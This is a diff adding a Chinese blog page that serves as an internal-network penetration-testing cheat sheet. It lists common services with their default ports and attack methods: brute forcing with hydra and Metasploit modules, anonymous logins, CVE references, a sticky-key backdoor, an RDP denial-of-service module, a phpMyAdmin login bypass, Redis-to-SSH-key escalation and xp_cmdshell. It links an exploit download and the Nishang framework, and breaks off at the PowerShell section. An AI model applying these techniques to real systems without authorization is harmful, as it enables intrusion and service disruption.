@@ -1,0 +1,1413 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>内网渗透 - 剑胆琴心</title><meta name="author" content="剑胆琴心">
+<meta name="author-link" content="http://geoer.cn">
+<meta name="description" content="内网分类： 带域环境的内网 不带域环境的内网 一些端口 文件共享服务端口渗透 比如学校机房有专门用来下载文件的服务器 ftp服务 FTP服务： ftp服务我" /><meta name="keywords" content='内网, 渗透' /><meta itemprop="name" content="内网渗透">
+<meta itemprop="description" content="内网分类： 带域环境的内网 不带域环境的内网 一些端口 文件共享服务端口渗透 比如学校机房有专门用来下载文件的服务器 ftp服务 FTP服务： ftp服务我"><meta itemprop="datePublished" content="2020-03-05T12:23:24+08:00" />
+<meta itemprop="dateModified" content="2023-01-21T16:47:23+08:00" />
+<meta itemprop="wordCount" content="6151"><meta itemprop="image" content="https://geoer.cn/logo.png"/>
+<meta itemprop="keywords" content="内网,渗透," /><meta property="og:title" content="内网渗透" />
+<meta property="og:description" content="内网分类： 带域环境的内网 不带域环境的内网 一些端口 文件共享服务端口渗透 比如学校机房有专门用来下载文件的服务器 ftp服务 FTP服务： ftp服务我" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://geoer.cn/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" /><meta property="og:image" content="https://geoer.cn/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-03-05T12:23:24+08:00" />
+<meta property="article:modified_time" content="2023-01-21T16:47:23+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://geoer.cn/logo.png"/>
+
+<meta name="twitter:title" content="内网渗透"/>
+<meta name="twitter:description" content="内网分类： 带域环境的内网 不带域环境的内网 一些端口 文件共享服务端口渗透 比如学校机房有专门用来下载文件的服务器 ftp服务 FTP服务： ftp服务我"/>
+<meta name="application-name" content="剑胆琴心">
+<meta name="apple-mobile-web-app-title" content="剑胆琴心"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://geoer.cn/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" /><link rel="prev" href="https://geoer.cn/scrcpy-%E6%89%8B%E6%9C%BA%E4%B8%8E%E7%94%B5%E8%84%91%E6%8A%95%E5%B1%8F%E7%A5%9E%E5%99%A8/" /><link rel="next" href="https://geoer.cn/ubuntu-server-%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "内网渗透",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/geoer.cn\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/"
+    },"image": [{
+              "@type": "ImageObject",
+              "url": "https:\/\/geoer.cn\/images\/Apple-Devices-Preview.jpg",
+              "width":  1842 ,
+              "height":  1036 
+            }],"genre": "posts","keywords": "内网, 渗透","wordcount":  6151 ,
+    "url": "https:\/\/geoer.cn\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/","datePublished": "2020-03-05T12:23:24+08:00","dateModified": "2023-01-21T16:47:23+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+      "@type": "Organization",
+      "name": "剑胆琴心","logo": {
+          "@type": "ImageObject",
+          "url": "https:\/\/geoer.cn\/images\/avatar.png",
+          "width":  438 ,
+          "height":  438 
+        }},"author": {
+        "@type": "Person",
+        "name": "剑胆琴心"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tests/"
+                title="FixIt 测试"
+                
+              ><i class="fa-solid fa-flask fa-fw fa-sm" aria-hidden="true"></i> 测试</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                title="友情链接"
+                
+              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="/images/avatar.png"
+    title="/images/avatar.png" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tests/"
+                  title="FixIt 测试"
+                  
+                ><i class="fa-solid fa-flask fa-fw fa-sm" aria-hidden="true"></i> 测试</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  title="友情链接"
+                  
+                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="https://github.com/shuai06"
+                  title="GitHub"
+                  rel="noopener noreferrer" target="_blank"
+                ><i class='fa-brands fa-github fa-fw' aria-hidden='true'></i> </a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span>内网渗透</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="http://geoer.cn" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img
+    class="lazyload avatar"
+    src="/svg/loading.min.svg"
+    data-src="https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp"
+    data-srcset="https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp, https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp 1.5x, https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心"/>&nbsp;剑胆琴心</a></span>
+          <span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 渗透测试</a></span></div>
+      <div class="post-meta-line"><span title=2020-03-05&#32;12:23:24><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2020-03-05">2020-03-05</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 6151 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 13 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="内网渗透">
+              <i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
+            </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#文件共享服务端口渗透">文件共享服务端口渗透</a>
+          <ul>
+            <li><a href="#ftp服务">ftp服务</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#攻击方式">攻击方式：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#samba服务">Samba服务</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#攻击方式-1">攻击方式：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#ldap协议">LDAP协议</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#攻击方式-2">攻击方式：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#远程连接服务端口渗透">远程连接服务端口渗透</a>
+          <ul>
+            <li><a href="#ssh服务">SSH服务</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#攻击方式-3">攻击方式：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#telent服务">Telent服务</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#攻击方式-4">攻击方式：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#远程桌面连接">远程桌面连接</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#攻击方式-5">攻击方式：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#vnc服务">VNC服务</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#攻击方式-6">攻击方式：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#第三方软件">第三方软件</a></li>
+          </ul>
+        </li>
+        <li><a href="#web应用服务端口渗透">Web应用服务端口渗透</a>
+          <ul>
+            <li><a href="#1中间件平台渗透">1.中间件平台渗透</a></li>
+            <li><a href="#2web应用程序渗透">2.WEB应用程序渗透</a></li>
+          </ul>
+        </li>
+        <li><a href="#数据库服务端口渗透">数据库服务端口渗透</a>
+          <ul>
+            <li><a href="#mysql数据库">MySQL数据库</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#攻击方式-7">攻击方式：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#mssql数据库">MSSQL数据库</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#攻击方式-8">攻击方式：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#oracle数据库">Oracle数据库</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#攻击方式-9">攻击方式：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#postgresql数据库">PostgreSQL数据库</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#攻击方式-10">攻击方式：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#mongodb数据库">MongoDB数据库</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#攻击方式-11">攻击方式：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#redis数据库">Redis数据库</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#攻击方式-12">攻击方式：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#sysbase数据库">SysBase数据库</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#攻击方式-13">攻击方式：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#db2数据库">DB2数据库</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#攻击方式-14">攻击方式：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#邮件服务端口渗透">邮件服务端口渗透</a>
+          <ul>
+            <li><a href="#smtp协议">SMTP协议</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#攻击方式-15">攻击方式：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#pop3协议">POP3协议</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#攻击方式-16">攻击方式：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#imap协议">IMAP协议</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#攻击方式-17">攻击方式：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#网络常见协议端口渗透">网络常见协议端口渗透</a>
+          <ul>
+            <li><a href="#dns服务">DNS服务</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#攻击方式-18">攻击方式：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#dhcp服务">DHCP服务</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#攻击方式-19">攻击方式：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#snmp协议">SNMP协议</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#安装问题">安装问题</a></li>
+            <li><a href="#目录结构">目录结构：</a></li>
+            <li><a href="#模块和功能介绍">模块和功能介绍：</a></li>
+            <li><a href="#演示">演示：</a></li>
+            <li><a href="#实战应用">实战应用：</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#后续控制">后续控制</a></li>
+                    <li><a href="#域渗透">域渗透</a></li>
+                    <li><a href="#系统提权">系统提权</a></li>
+                    <li><a href="#powershell下载文件nishang">powershell下载文件(nishang)</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h1 id="内网分类">内网分类：</h1>
+<ul>
+<li>带域环境的内网</li>
+<li>不带域环境的内网</li>
+</ul>
+<h1 id="一些端口">一些端口</h1>
+<h3 id="文件共享服务端口渗透">文件共享服务端口渗透</h3>
+<blockquote>
+<p>比如学校机房有专门用来下载文件的服务器</p>
+</blockquote>
+<h4 id="ftp服务">ftp服务</h4>
+<p><strong>FTP服务：</strong> ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；
+**默认端口：**20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）</p>
+<h6 id="攻击方式">攻击方式：</h6>
+<ul>
+<li>爆破：ftp的爆破工具有很多：Bruter，以及msf中ftp爆破模块；</li>
+<li>匿名访问：用户名：anonymous 密码：为空或任意邮箱</li>
+</ul>
+<h4 id="samba服务">Samba服务</h4>
+<p>**Samba服务：**对于这个可以在windows与Linux之间进行共享文件的服务同样是我们攻击的关注点；samba登录分为两种方式，一种是需要用户名口令；另一种是不需要用户名口令。在很多时候不光是pc机，还有一些服务器，网络设备都开放着此服务，方便进行文件共享，但是同时也给攻击者提供了便利。
+默认端口：137（主要用户NetBIOS Name Service；NetBIOS名称服务）、139（NetBIOS Session Service，主要提供samba服务）</p>
+<h6 id="攻击方式-1">攻击方式：</h6>
+<ul>
+<li>爆破：弱口令（爆破工具采用hydra）hydra -l username -P</li>
+<li>PassFile IP smb</li>
+<li>未授权访问：给予public用户高权限</li>
+<li>远程代码执行漏洞：CVE-2015-0240、CVE-2017-7494等等</li>
+</ul>
+<h4 id="ldap协议">LDAP协议</h4>
+<p>**ldap：**轻量级目录访问协议，最近几年随着ldap的广泛使用被发现的漏洞也越来越多。但是毕竟主流的攻击方式仍旧是那些，比如注入，未授权等等；这些问题的出现也都是因为配置不当而造成的。
+默认端口：389</p>
+<h6 id="攻击方式-2">攻击方式：</h6>
+<ul>
+<li>注入攻击盲注</li>
+<li>未授权访问</li>
+<li>爆破：弱口令</li>
+</ul>
+<h3 id="远程连接服务端口渗透">远程连接服务端口渗透</h3>
+<h4 id="ssh服务">SSH服务</h4>
+<p><strong>SSH服务：</strong>  这个服务基本会出现在我们的Linux服务器，网络设备，安全设备等设备上，而且很多时候这个服务的配置都是默认的；对于SSH服务我们可能使用爆破攻击方式较多。
+<strong>默认端口：</strong>    22</p>
+<h6 id="攻击方式-3">攻击方式：</h6>
+<ul>
+<li>爆破：</li>
+<li>弱口令</li>
+<li>漏洞：28退格漏洞、OpenSSL漏洞</li>
+</ul>
+<h4 id="telent服务">Telent服务</h4>
+<p>**Telnet服务：**在SSH服务崛起的今天我们已经很难见到使用telnet的服务器，但是在很多设备上同样还是有这个服务的；比如cisco、华三，深信服等厂商的设备；我就有很多次通过telnet弱口令控制这些设备；
+<strong>默认端口：</strong>  23</p>
+<h6 id="攻击方式-4">攻击方式：</h6>
+<ul>
+<li>爆破：弱口令</li>
+<li>嗅探：此种情况一般发生在局域网</li>
+</ul>
+<h4 id="远程桌面连接">远程桌面连接</h4>
+<p>**远程桌面连接：**作为windows上进行远程连接的端口，很多时候我们在得到系统为windows的shell的时候我们总是希望可以登录3389实际操作对方电脑；这个时候我们一般的情况分为两种。一种是内网，需要先将目标机3389端口反弹到外网；另一种就是外网，我们可以直接访问；当然这两种情况我们利用起来可能需要很苛刻的条件，比如找到登录密码等等；
+<strong>默认端口：</strong>  3389</p>
+<h6 id="攻击方式-5">攻击方式：</h6>
+<ul>
+<li>爆破：3389端口爆破工具就有点多了(7kbScan-RDP-Sniper，msf的爆破模块)</li>
+<li>Shift粘滞键后门：5次shift后门</li>
+<li>3389漏洞攻击：利用ms12-020攻击3389端口，导致服务器关机（msf的模块有检测auxiliary/scanner/rdp/ms_12_&hellip;，利用模块auxiliary/dos/windows/rdp/ms12_020_maxchannelids）</li>
+</ul>
+<h4 id="vnc服务">VNC服务</h4>
+<p><strong>VNC服务:</strong>    一款优秀的远控工具，常用语类UNIX系统上，简单功能强大；也
+**默认端口：**5900+桌面ID（5901；5902）</p>
+<h6 id="攻击方式-6">攻击方式：</h6>
+<ul>
+<li>爆破：弱口令</li>
+<li>认证口令绕过：</li>
+<li>拒绝服务攻击：（CVE-2015-5239）</li>
+<li>权限提升：（CVE-2013-6886）</li>
+</ul>
+<h4 id="第三方软件">第三方软件</h4>
+<p>&hellip; &hellip;</p>
+<h3 id="web应用服务端口渗透">Web应用服务端口渗透</h3>
+<h4 id="1中间件平台渗透">1.中间件平台渗透</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">IIS Apache Nginx Weblogic tomcat Jboos Websphere等
+</span></span><span class="line"><span class="cl"># 可使用vulhub靶场测试 `中间件漏洞集合PDF`， `未授权访问集合PDF`
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="2web应用程序渗透">2.WEB应用程序渗透</h4>
+<ul>
+<li>
+<p>已知CMS</p>
+</li>
+<li>
+<p>未知CMS</p>
+</li>
+<li>
+<p>常规漏洞测试</p>
+</li>
+</ul>
+<h3 id="数据库服务端口渗透">数据库服务端口渗透</h3>
+<p>针对所有的	数据库攻击方式都存在SQL注入，这里先提出来在下面就不一一写了免得大家说我占篇幅；当然不同的数据库注入技巧可能不一样，特别是NoSQL与传统的SQL数据库不太一样。但是这不是本文需要介绍的重点，后面有时间会写一篇不同数据库的渗透技巧。</p>
+<h4 id="mysql数据库">MySQL数据库</h4>
+<p><strong>默认端口：</strong> 3306</p>
+<h6 id="攻击方式-7">攻击方式：</h6>
+<ul>
+<li>爆破：弱口令</li>
+<li>身份认证漏洞：CVE-2012-2122</li>
+<li>拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器</li>
+<li>Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意</li>
+</ul>
+<h4 id="mssql数据库">MSSQL数据库</h4>
+<p>**默认端口：**1433（Server 数据库服务）、1434（Monitor 数据库监控）</p>
+<h6 id="攻击方式-8">攻击方式：</h6>
+<ul>
+<li>爆破：弱口令</li>
+</ul>
+<h4 id="oracle数据库">Oracle数据库</h4>
+<p>**默认端口：**1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）</p>
+<h6 id="攻击方式-9">攻击方式：</h6>
+<ul>
+<li>爆破：弱口令</li>
+<li>漏洞攻击</li>
+</ul>
+<h4 id="postgresql数据库">PostgreSQL数据库</h4>
+<p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括我们kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。
+<strong>默认端口：</strong> 5432</p>
+<h6 id="攻击方式-10">攻击方式：</h6>
+<ul>
+<li>爆破弱口令：postgres postgres</li>
+<li>缓冲区溢出：CVE-2014-2669</li>
+</ul>
+<h4 id="mongodb数据库">MongoDB数据库</h4>
+<p>MongoDB：NoSQL数据库；攻击方法与其他数据库类似；关于它的安全讲解：请参考
+<strong>默认端口：</strong>  27017</p>
+<h6 id="攻击方式-11">攻击方式：</h6>
+<ul>
+<li>
+<p>爆破弱口令</p>
+</li>
+<li>
+<p>未授权访问</p>
+</li>
+</ul>
+<h4 id="redis数据库">Redis数据库</h4>
+<p>redis：是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。</p>
+<p>Exp：https://yunpan.cn/cYjzHxawFpyVt 访问密码 e547
+<strong>默认端口：</strong>  6379</p>
+<h6 id="攻击方式-12">攻击方式：</h6>
+<ul>
+<li>
+<p>爆破弱口令</p>
+</li>
+<li>
+<p>未授权访问+配合ssh key提权</p>
+</li>
+</ul>
+<h4 id="sysbase数据库">SysBase数据库</h4>
+<p>**默认端口：**服务端口5000；监听端口4100；备份端口：4200</p>
+<h6 id="攻击方式-13">攻击方式：</h6>
+<ul>
+<li>爆破：</li>
+<li>弱口令;</li>
+<li>命令注入</li>
+</ul>
+<h4 id="db2数据库">DB2数据库</h4>
+<p>**默认端口：**5000</p>
+<h6 id="攻击方式-14">攻击方式：</h6>
+<ul>
+<li>安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）</li>
+</ul>
+<p>**总结一下：**对于数据库，我们得知端口很多时候可以帮助我们去渗透，比如得知mysql的 数据库，我们就可以使用SQL注入进行mof、udf等方式提权；如果是mssql我们就可以使用xp_cmdshell来进行提权；如果是其它的数据 库，我们也可以采用对应的方式；比如各大数据库对应它们的默认口令，版本对应的漏洞！</p>
+<h3 id="邮件服务端口渗透">邮件服务端口渗透</h3>
+<h4 id="smtp协议">SMTP协议</h4>
+<p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！
+<strong>默认端口：</strong>  25（smtp）、465（smtps）</p>
+<h6 id="攻击方式-15">攻击方式：</h6>
+<ul>
+<li>
+<p>爆破：弱口令</p>
+</li>
+<li>
+<p>未授权访问</p>
+</li>
+</ul>
+<h4 id="pop3协议">POP3协议</h4>
+<p><strong>默认端口：</strong> 109（POP2）、110（POP3）、995（POP3S）</p>
+<h6 id="攻击方式-16">攻击方式：</h6>
+<ul>
+<li>
+<p>爆破弱口令</p>
+</li>
+<li>
+<p>未授权访问</p>
+</li>
+</ul>
+<h4 id="imap协议">IMAP协议</h4>
+<p>**默认端口：**143（imap）、993（imaps）</p>
+<h6 id="攻击方式-17">攻击方式：</h6>
+<ul>
+<li>
+<p>爆破：弱口令</p>
+</li>
+<li>
+<p>配置不当</p>
+</li>
+</ul>
+<h3 id="网络常见协议端口渗透">网络常见协议端口渗透</h3>
+<h4 id="dns服务">DNS服务</h4>
+<p><strong>默认端口：</strong> 53</p>
+<h6 id="攻击方式-18">攻击方式：</h6>
+<ul>
+<li>区域传输漏洞</li>
+</ul>
+<h4 id="dhcp服务">DHCP服务</h4>
+<p>**默认端口：**67&amp;68、546（DHCP Failover做双机热备的）</p>
+<h6 id="攻击方式-19">攻击方式：</h6>
+<ul>
+<li>DHCP劫持</li>
+</ul>
+<h4 id="snmp协议">SNMP协议</h4>
+<p><strong>默认端口：</strong> 161
+攻击方式:</p>
+<ul>
+<li>爆破弱口令</li>
+</ul>
+<hr>
+<h1 id="powershell框架">Powershell框架</h1>
+<blockquote>
+<p>推荐使用 NiShang</p>
+</blockquote>
+<blockquote>
+<p>参考文章：https://www.4hou.com/posts/E99ml</p>
+</blockquote>
+<blockquote>
+<p>下载地址: <a href="https://github.com/samratashok/nishang"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/samratashok/nishang<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+</blockquote>
+<blockquote>
